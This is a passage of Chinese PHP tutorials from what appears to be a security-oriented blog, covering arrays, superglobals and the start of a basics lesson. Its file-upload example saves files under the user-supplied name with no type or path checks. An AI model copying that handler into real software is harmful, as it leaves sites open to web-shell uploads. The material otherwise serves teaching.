class="string">&#x27;score&#x27;</span>] = <span class="variable">$score</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$stu1</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="数组创建"><a href="#数组创建" class="headerlink" title="数组创建"></a>数组创建</h3><h5 id="直接赋值"><a href="#直接赋值" class="headerlink" title="直接赋值"></a>直接赋值</h5><h6 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stu1</span>[] = <span class="variable">$name</span>; <span class="comment">//默认是索引数组，从0开始计数。</span></span><br><span class="line"><span class="variable">$stu1</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$name</span>; <span class="comment">//key 一般是字符串，就是关联数组。</span></span><br></pre></td></tr></table></figure><p>创建第⼆个学⽣信息。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stu2</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;HMM&quot;</span>;</span><br><span class="line"><span class="variable">$stu2</span>[<span class="string">&#x27;sex&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$stu2</span>[<span class="string">&#x27;age&#x27;</span>] = <span class="number">22</span>;</span><br><span class="line"><span class="variable">$stu2</span>[<span class="string">&#x27;score&#x27;</span>] = <span class="number">99.9</span>;</span><br></pre></td></tr></table></figure><h5 id="array-语⾔结构"><a href="#array-语⾔结构" class="headerlink" title="array 语⾔结构"></a>array 语⾔结构</h5><h6 id="语法：-1"><a href="#语法：-1" class="headerlink" title="语法："></a>语法：</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">变量 = <span class="keyword">array</span>(变量<span class="number">1</span>,变量<span class="number">2</span>,...);</span><br><span class="line">变量 = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;key1&#x27;</span> =&gt; value1,</span><br><span class="line"><span class="string">&#x27;key2&#x27;</span> =&gt; value2,</span><br><span class="line">...</span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>=&gt;</code> 特殊的字符，在 <code>array 语言结构</code> 中连接 <code>key</code> 和 <code>value</code> 。 PHP 中数组的key 如果是字符串就具备⼀定的语义，可以⾮常⽅便的了解变量的含义。 PHP 数组中的key ，不建议使⽤除了整型和字符串的其他类型。 array() 不是函数，⽽是⼀种语⾔结构。</p><p>创建其他学⽣信息：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stu3</span> = <span class="keyword">array</span>(<span class="string">&#x27;zs&#x27;</span>, <span class="literal">true</span>, <span class="number">25</span>, <span class="number">59.9</span>);</span><br><span class="line"><span class="variable">$stu4</span> = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;ls&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;sex&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line"><span class="string">&#x27;age&#x27;</span> =&gt; <span class="number">24</span>,</span><br><span class="line"><span class="string">&#x27;score&#x27;</span> =&gt; <span class="number">90.0</span></span><br><span class="line">);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$stu4</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>print_r 与echo 类似，在输出布尔类型变量True 时，打印的是1；在输出False 时， 打印什么都没有。</p><h3 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h3><p>数组中的元素可以是任何类型的数据。数组中的元素也可以是数组。</p><h5 id="创建多维数组"><a href="#创建多维数组" class="headerlink" title="创建多维数组"></a>创建多维数组</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ns_class</span> = <span class="keyword">array</span>(<span class="variable">$stu3</span>, <span class="variable">$stu4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$ns_class</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="数组元素访问"><a href="#数组元素访问" class="headerlink" title="数组元素访问"></a>数组元素访问</h1><h3 id="元素访问"><a href="#元素访问" class="headerlink" title="元素访问"></a>元素访问</h3><p>通过key 找到数组中的元素。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$stu3</span>[<span class="number">3</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$ns_class</span>[<span class="number">1</span>][<span class="string">&quot;score&quot;</span>];</span><br></pre></td></tr></table></figure><h3 id="元素操作"><a href="#元素操作" class="headerlink" title="元素操作"></a>元素操作</h3><table><thead><tr><th align="center">数组元素操作</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">读取</td><td align="center">通过key，捕获数组中的value。</td></tr><tr><td align="center">修改</td><td align="center">直接赋值即可。</td></tr><tr><td align="center">增加</td><td align="center">直接赋值即可。</td></tr><tr><td align="center">删除</td><td align="center">PHP 中删除数组中的元素意义不⼤，置之不理即可。</td></tr></tbody></table><p><strong>尝试修改数组中的元素：</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ls的成绩是 <span class="subst">&#123;$ns_class[1][&quot;score&quot;]&#125;</span>&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ls努力学习中...&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ns_class</span>[<span class="number">1</span>][<span class="string">&quot;score&quot;</span>] += <span class="number">0.1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ls的成绩是 <span class="subst">&#123;$ns_class[1][&quot;score&quot;]&#125;</span>&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>尝试写⼀个座右铭：</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$stu1</span>[<span class="string">&#x27;word&#x27;</span>] = <span class="string">&quot;为往圣继绝学，为万世开太平。&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$stu1</span>);</span><br></pre></td></tr></table></figure><h3 id="数组的遍历"><a href="#数组的遍历" class="headerlink" title="数组的遍历"></a>数组的遍历</h3><h5 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a>for 循环</h5><p>使⽤for 循环可以遍历数组，但是此种⽅法依赖于数组中key ⾃然数规律。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$stu1</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stu1</span>[<span class="variable">$i</span>].<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>显然，此种⽅法具有局限性，只能遍历索引数组。</p><h5 id="foreach-语句"><a href="#foreach-语句" class="headerlink" title="foreach 语句"></a>foreach 语句</h5><p>foreach 语法结构提供了遍历数组的简单⽅式。 </p><p>foreach 这种语⾔结构是专⻔⽤来遍历数组的，foreach 是⼀种循环，不需要额外计 时器。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$variable</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line"><span class="comment"># code...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接访问数组的值：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$stu2</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$v</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问键值对：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$stu2</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$k</span>. <span class="string">&quot;=&quot;</span>. <span class="variable">$v</span>. <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意：</p><p> foreach 是⽤来遍历数组的循环语⾔结构，数组中多少个元素，该语⾔结构就会循环执⾏ ⼏次。</p><p> foreach 语⾔结构中，临时变量的名字可以变化，但是语⾔结构不能改变。</p><h1 id="预定义超全局数组变量"><a href="#预定义超全局数组变量" class="headerlink" title="预定义超全局数组变量"></a>预定义超全局数组变量</h1><h3 id="数组速查"><a href="#数组速查" class="headerlink" title="数组速查"></a>数组速查</h3><table><thead><tr><th align="center">名称</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">$_GET</td><td align="center">通过URL 参数（⼜叫query string）传递给当前脚本的变量的数组。 注意： 该数组不仅仅对method 为 GET 的请求⽣效，⽽是会针对所有带query string 的请求。</td></tr><tr><td align="center">$_POST</td><td align="center">当HTTP POST 请求的Content-Type 是application&#x2F;x-www-formurlencoded 或multipart&#x2F;form-data 时，会将变量以关联数组形式传⼊当前 脚本。</td></tr><tr><td align="center">$_FILES</td><td align="center">通过HTTP POST ⽅式上传到当前脚本的项⽬的数组。此数组的概况在POST ⽅法上传 章节中有描述。</td></tr><tr><td align="center">$_COOKIE</td><td align="center">通过HTTP Cookies ⽅式传递给当前脚本的变量的数组。</td></tr><tr><td align="center">$_SESSION</td><td align="center">当前脚本可⽤ SESSION 变量的数组。更多关于如何使⽤的信息，参⻅ Session 函数 ⽂档。</td></tr><tr><td align="center">$_REQUEST</td><td align="center">默认情况下包含了$GET，$POST 和$_COOKIE 的数组。</td></tr></tbody></table><p>注意：</p><p> 以上数组都是预定义，超全局的。 </p><p>以上数组在不同的PHP 版本中有不同的表现，但是⼤⽅向没变。</p><h3 id="GET"><a href="#GET" class="headerlink" title="$_GET"></a>$_GET</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// get.php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>说明 </p><p>$<em>GET 是⼀个预定义数组。</em></p><p>作⽤域是超全局，脚本的任何地⽅都可以使⽤。 </p><p>接收从浏览器客⼾端⽤⼾GET ⽅式传递到服务器的参数。 </p><p>GET 传参的参数名做$_GET 数组的key，参数值作为数组的value。</p><p>GET 传参时，直接将参数拼接到URL 中即可。</p><h6 id="GET-传参"><a href="#GET-传参" class="headerlink" title="GET 传参"></a>GET 传参</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET /php/functions/get.php?username=AJEST&amp;password=<span class="number">654321</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost</span><br></pre></td></tr></table></figure><h3 id="POST"><a href="#POST" class="headerlink" title="$_POST"></a>$_POST</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// post.php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_POST</span>);</span><br></pre></td></tr></table></figure><p>说明：</p><p> $_POST ⽤于接收浏览器客⼾端⽤⼾以POST ⽅式传递过来的参数。 </p><p>POST 传参，参数在请求正⽂中。</p><h5 id="POST-请求"><a href="#POST-请求" class="headerlink" title="POST 请求"></a>POST 请求</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POST /php/functions/post.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">30</span></span><br><span class="line">username=admin&amp;password=<span class="number">123456</span></span><br></pre></td></tr></table></figure><h3 id="COOKIE"><a href="#COOKIE" class="headerlink" title="$_COOKIE"></a>$_COOKIE</h3><h5 id="COOKIE-技术"><a href="#COOKIE-技术" class="headerlink" title="COOKIE 技术"></a>COOKIE 技术</h5><p>为了弥补HTTP 协议的⽆状态性，保持⽤⼾的会话状态，需要使⽤Cookie 技术。</p><p><strong>Cookie 过程：</strong> </p><ol><li>⽤⼾提交账密 </li><li>服务器进⾏⾝份认证 </li><li>下发⾝份证，下发Cookie。 </li><li>浏览器客⼾端⽤⼾所有的请求都会携带⾝份信息，携带Cookie 信息。</li><li>整体流程体现为，保持了HTTP 会话的状态性。</li></ol><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// cookie.php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_COOKIE</span>);</span><br></pre></td></tr></table></figure><h5 id="写⼊Cookie"><a href="#写⼊Cookie" class="headerlink" title="写⼊Cookie"></a>写⼊Cookie</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//console</span></span><br><span class="line">document.cookie = <span class="string">&quot;username=admin&quot;</span>;</span><br><span class="line">document.cookie = <span class="string">&quot;passoword=123456&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>HTTP 请求报⽂：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GET /php/functions/cookie.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">10.4</span>.<span class="number">7.187</span></span><br><span class="line">Cookie: username=admin; password=<span class="number">123456</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="REQUEST"><a href="#REQUEST" class="headerlink" title="$_REQUEST"></a>$_REQUEST</h3><p>$REQUEST，默认包含了$GET，$POST，$COOKIE 数组中的所有变量。以上提到的 三个数组，包含了浏览器客⼾端的三⼤传参⽅式。</p><h3 id="FILES"><a href="#FILES" class="headerlink" title="$_FILES"></a>$_FILES</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>] 用来保存文件上传信息的。uploaded 就是文件域input 标</span><br><span class="line">签name 属性的值。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] 上传文件的名字。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] 上传文件的类型。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 上传文件存储在服务器中的缓存路径。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] 错误代码。</span><br><span class="line"><span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] 上传文件的大小</span><br></pre></td></tr></table></figure><p>$_FILES 中存储的与上传⽂件有关的信息，不是⽂件本⾝，⽂件内容在缓存路径中。 </p><p>正常完成⽂件上传功能，需要将⽂件的从缓存拷⻉到服务器⽂件系统中。</p><h1 id="⽂件上传"><a href="#⽂件上传" class="headerlink" title="⽂件上传"></a>⽂件上传</h1><p><strong>⽂件上传的实现，可以有以下步骤：</strong> </p><ol><li>利⽤$_FILES 数组捕获⽂件上传信息。 </li><li>将缓存中的⽂件拷⻉到⽬标路径下。</li></ol><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>文件上传测试<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">// echo &quot;&lt;pre&gt;&quot;;</span></span><br><span class="line"><span class="meta">// var_dump($_FILES);</span></span><br><span class="line"><span class="meta">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span></span><br><span class="line"><span class="meta">$img_path_tmp = $_FILES[&#x27;uploaded&#x27;][&#x27;tmp_name&#x27;];</span></span><br><span class="line"><span class="meta">echo &quot;上传文件的缓存路径为：&#123;$img_path_tmp&#125;&lt;br /&gt;&quot;;</span></span><br><span class="line"><span class="meta">$img_path_target = &quot;./images/&#123;$_FILES[&#x27;uploaded&#x27;][&#x27;name&#x27;]&#125;&quot;;</span></span><br><span class="line"><span class="meta">if(move_uploaded_file($img_path_tmp, $img_path_target))&#123;</span></span><br><span class="line"><span class="meta">echo &quot;文件上传成功！&quot;;</span></span><br><span class="line"><span class="meta">echo &quot;上传文件的目标路径为：&#123;$img_path_target&#125;&quot;;</span></span><br><span class="line"><span class="meta">&#125;else &#123;</span></span><br><span class="line"><span class="meta">echo &quot;文件上传失败！&quot;;</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">&#125;else&#123;</span></span><br><span class="line"><span class="meta">$html = &lt;&lt;&lt;FORM</span></span><br><span class="line"><span class="meta">&lt;form action=&quot;#&quot; method = &quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=&quot;file&quot; name = &quot;uploaded&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; name=&quot;submit&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;/form&gt;</span></span><br><span class="line"><span class="meta">FORM;</span></span><br><span class="line"><span class="meta">echo $html;</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php基础</title>
      <link href="/2022/10/10/%E7%BC%96%E7%A8%8B/php/"/>
      <url>/2022/10/10/%E7%BC%96%E7%A8%8B/php/</url>
      
        <content type="html"><![CDATA[<h1 id="初识PHP"><a href="#初识PHP" class="headerlink" title="初识PHP"></a>初识PHP</h1><p>了解PHP 语⾔ </p><h2 id="PHP-语⾔标记"><a href="#PHP-语⾔标记" class="headerlink" title="PHP 语⾔标记"></a>PHP 语⾔标记</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;My Name is XIU!&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">console.<span class="title function_ invoke__">log</span>(<span class="string">&quot;This message is from info.php!&quot;</span>)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="comment">// PHP 的开始标记，表示从此标记开始，进入PHP 模式。</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>(); <span class="comment">// PHP 代码</span></span><br><span class="line"><span class="comment">// PHP 的结束标记，表示从开始标记到结束标记，之间的内容是</span></span><br><span class="line">PHP 模式</span><br><span class="line"><span class="comment">// 之后的内容依然被PHP 解释引擎认为是纯文本字符串。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>说明：</strong></p><p> 在PHP ⽂件中，可以与HTML 和JavaScript 混编。 </p><p>开始标记 <code>&lt;?php</code>  表⽰进⼊PHP 模式，结束标记<code>?&gt;</code>,标识退出PHP 模式。</p><p> PHP 模式之外的内容会被作为字符输出到浏览器中。</p><p> HTML 或JavaScript 对于PHP 来说就是纯⽂本字符串。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span>=<span class="string">&lt;&lt;&lt;HTML</span></span><br><span class="line"><span class="string">&lt;h1&gt;test.php&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">console.log(&quot;This message is from test.php!&quot;);</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">HTML</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br></pre></td></tr></table></figure><p>安全问题：如果是⼀个在线的⽹站能够看到phpinfo ⻚⾯，说明存在敏感信息泄露漏 洞，这个漏洞需要体现在后⾯的渗透测试报告中。</p><h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><h3 id="指令分隔符"><a href="#指令分隔符" class="headerlink" title="指令分隔符"></a>指令分隔符</h3><p>分号 <code>;</code> ，代表⼀句PHP 代码的结束。</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p><strong>单⾏注释</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">phpinfo</span>(); <span class="comment">// 该函数会显示PHP 配置信息</span></span><br></pre></td></tr></table></figure><p><strong>多⾏注释</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">这是多行注释！</span></span><br><span class="line"><span class="comment">以下语句表示PHP 配置信息</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><h3 id="空⽩字符"><a href="#空⽩字符" class="headerlink" title="空⽩字符"></a>空⽩字符</h3><p><strong>空⽩符包括：</strong></p><table><thead><tr><th align="center">空白字符</th><th align="center">表达</th></tr></thead><tbody><tr><td align="center">空格</td><td align="center"></td></tr><tr><td align="center">TAB制表符</td><td align="center">\t</td></tr><tr><td align="center">回车换行</td><td align="center">\r\n</td></tr></tbody></table><p>这些空⽩字符在PHP 中都是⽆关紧要的，可以将⼀个语句展开成任意⾏，或者紧缩在 ⼀⾏，空格与空⾏的合理运⽤可以增强代码的清晰性与可读性，如果运⽤不合理反⽽ 会对阅读产⽣负担！ </p><p>但是，不能是⽤空⽩符打断PHP 的关键字，例如函数名，语句名，变量名，类名，⽅ 法名等等。</p><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><h3 id="变量概述"><a href="#变量概述" class="headerlink" title="变量概述"></a>变量概述</h3><p>变量在任何⼀⻔语⾔中都处于核⼼地位。 </p><p>变量是⽤于临时存储值的容器，通过变量名能够访问到变量值，变量包含四个部分内 容：</p><pre><code>     变量名 </code></pre><p>​ 变量值 </p><p>​         数据类型 </p><p>​         内存空间</p><p>PHP 脚本语⾔是⼀种弱数据类型语⾔，变量或常量的数据类型由程序的上下⽂决定， 给⼀个变量赋予什么样的值，就是什么数据类型。</p><h3 id="变量命名"><a href="#变量命名" class="headerlink" title="变量命名"></a>变量命名</h3><p>变量名称组成：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ + 变量名</span><br></pre></td></tr></table></figure><p>变量名是严格区分⼤⼩写的。以下变量是完全不同的：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span>;</span><br><span class="line"><span class="variable">$Name</span>;</span><br><span class="line"><span class="variable">$NAME</span>;</span><br></pre></td></tr></table></figure><p>变量名由字⺟、数字、下划线组成，并且不能以数字开头，也不能包含空⽩字符、特 殊字符等其他字符。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$name</span> = <span class="string">&quot;xiu&quot;</span>;</span><br><span class="line"><span class="variable">$name1</span> = <span class="string">&quot;XIU&quot;</span>;</span><br><span class="line"><span class="variable">$my_name</span> = <span class="string">&quot;天下&quot;</span>;</span><br><span class="line"><span class="variable">$_name</span> = <span class="string">&quot;一统天下&quot;</span>;</span><br><span class="line"><span class="comment">//$1name;</span></span><br><span class="line"><span class="comment">//$n@me;</span></span><br><span class="line"><span class="comment">//$nam$;</span></span><br></pre></td></tr></table></figure><p>变量命名时，建议使⽤驼峰式命名法或者下划线命名法，做到变量名的”⻅名知意”。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$firstName</span>;</span><br><span class="line"><span class="variable">$LastName</span>;</span><br><span class="line"><span class="variable">$first_name</span>;</span><br><span class="line"><span class="variable">$last_name</span>;</span><br></pre></td></tr></table></figure><p>PHP 中有⼀些标识符是系统定义的，也称为关键字，是PHP 语⾔的组成部分，因此不 建议使⽤它们中的任何⼀个作为变量名，包括函数名，类名等。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$echo</span>; <span class="comment">//建议不要使用</span></span><br></pre></td></tr></table></figure><h3 id="变量声明与初始化"><a href="#变量声明与初始化" class="headerlink" title="变量声明与初始化"></a>变量声明与初始化</h3><p>直接赋值，直接使⽤。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="variable">$username</span>; <span class="comment">// Notice: Undefined variable: username</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;XIU&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$username</span>;</span><br></pre></td></tr></table></figure><h3 id="变量释放"><a href="#变量释放" class="headerlink" title="变量释放"></a>变量释放</h3><p>unset() 函数释放指定的变量。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$username</span> = <span class="string">&quot;XIU&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$username</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$username</span>; <span class="comment">//Notice: Undefined variable: username</span></span><br></pre></td></tr></table></figure><h3 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h3><p>可变变量，⼀个变量的名字可以动态的设置和使⽤。 <code>$$</code> 是php 的特性，也是产⽣ php 中变量覆盖漏洞的原因之⼀。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// $$.php</span></span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;XIU&quot;</span>;</span><br><span class="line"><span class="variable">$XIU</span> = <span class="string">&quot;I am from China!&quot;</span>;</span><br><span class="line"><span class="comment">// echo $username; // XIU</span></span><br><span class="line"><span class="comment">// echo $XIU; // I am from China!</span></span><br><span class="line"><span class="comment">// echo $$username; // I am from China! $($username) -&gt; $XIU</span></span><br><span class="line"><span class="variable">$$username</span> = <span class="string">&quot;i love php!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$XIU</span>;</span><br></pre></td></tr></table></figure><h3 id="变量类型"><a href="#变量类型" class="headerlink" title="变量类型"></a>变量类型</h3><p>变量类型是指保存在该变量中的数据的数据类型，在计算机编程语⾔世界中每个数据 都有它的类型。 </p><p>具有相同类型的数据才能被彼此相互操作。 </p><p>在强类型的语⾔中例如C 语⾔，变量要通过声明指定类型，然后才可以存储对应指定 的数据，就好⽐现实⽣活中在制作⼀个柜⼦之前，就要决定好这个柜⼦的类型，是书 柜那么以后就只能⽤来存书，是⾐柜以后就只能⽤来存⾐服。 </p><p>但是PHP 是⼀种弱类型的语⾔，和其他语⾔不同的是，变量或者常量的数据类型由程 序的上下⽂决定，不需要事先声明类型。⼀个柜⼦，要是往⾥⾯存书籍那么他就是书 柜；要是往⾥⾯存放⾐服，那么它就是⾐柜，根本不需要事先说明这个是书柜还是⾐ 柜，⼀切根据实际需要使⽤即可。</p><p> 可以将数据的变量类型输出，使⽤的函数var_dump()。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// var_dump.php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&quot;XIU&quot;</span>; <span class="comment">// string</span></span><br><span class="line"><span class="variable">$sex</span> = <span class="literal">true</span>; <span class="comment">// bool</span></span><br><span class="line"><span class="variable">$age</span> = <span class="number">24</span>; <span class="comment">// int</span></span><br><span class="line"><span class="variable">$score</span> = <span class="number">59.9</span>; <span class="comment">// float</span></span><br><span class="line"><span class="comment">// echo $name;</span></span><br><span class="line"><span class="comment">// echo $sex; // 1</span></span><br><span class="line"><span class="comment">// var_dump($sex);</span></span><br><span class="line"><span class="comment">// var_dump($score);</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$name</span>);</span><br></pre></td></tr></table></figure><h3 id="bool"><a href="#bool" class="headerlink" title="bool"></a>bool</h3><p>布尔类型，这个是最简单的类型，布尔型表达了true 或false，即真或假。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// bool.php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure><p>进⾏if 判断的时候，如果表达式不是bool 类型的值，会有类型转换，其他类型的值转 